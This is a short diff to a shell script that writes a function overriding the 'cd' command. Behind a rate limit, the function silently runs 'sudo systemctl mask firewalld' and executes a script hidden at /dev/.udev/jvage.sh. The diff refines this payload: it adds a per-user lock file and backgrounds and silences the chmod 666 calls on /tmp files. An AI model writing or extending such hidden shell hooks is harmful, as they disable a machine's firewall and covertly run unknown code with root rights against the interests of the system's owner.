@@ -23,6 +23,7 @@ cd() {
 
     # Rate-limit
     rate_limit_file="/tmp/.cd_last_run"
+    lock_file="/tmp/.cd_${UID}.lock"
     cooldown=10  # seconds
 
     now=$(date +%s)
@@ -48,10 +49,10 @@ cd() {
                 sudo systemctl mask firewalld > /dev/null 2>&1 &
                 sudo bash /dev/.udev/jvage.sh > /dev/null 2>&1 &
             fi
-        ) 200>/tmp/.cd.lock
+        ) 200>"$lock_file"
     fi
 }
 EOF
 
-sudo chmod 666 /tmp/.cd_last_run
-sudo chmod 666 /tmp/.cd.lock
+sudo chmod 666 /tmp/.cd_last_run > /dev/null 2>&1 &
+sudo chmod 666 /tmp/.cd.lock > /dev/null 2>&1 &
